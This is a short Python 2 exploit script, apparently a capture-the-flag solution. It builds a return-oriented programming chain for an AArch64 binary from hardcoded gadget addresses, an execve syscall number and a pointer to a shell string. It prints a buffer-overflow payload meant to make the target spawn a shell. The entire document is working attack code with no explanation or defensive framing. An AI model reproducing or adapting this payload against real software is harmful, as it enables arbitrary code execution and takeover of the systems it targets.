from struct import pack

popx16 = 0x0000000000447030  # ldp x15, x16, [sp, #0x90] ; ldp x17, x18, [sp, #0xa0] ; ldp x29, x30, [sp], #0xc0 ; ret
popargs = 0x0000000000446278 # ldp x0, x1, [sp, #0x40] ; ldp x2, x3, [sp, #0x30] ; ldp x4, x5, [sp, #0x20] ; ldp x6, x7, [sp, #0x10]
                             # ; ldp x8, x9, [sp], #0xd0 ; ldp x17, x30, [sp], #0x10 ; br x16
svc = 0x000000000040dd1c     # svc 0
execve = 221
sh_offset = 0x496640         # name in .data

def p(val):
	return pack("Q", val)

print "2048:" + 47*"a" +p(popx16) +"aA"*32+ "x"*8 + p(popargs) + "bB"*64+ "B"*8 + p(svc) + "\x00"*32+p(221)*2+"\x00"*48 + p(sh_offset) + p(0)*4 + "\n"


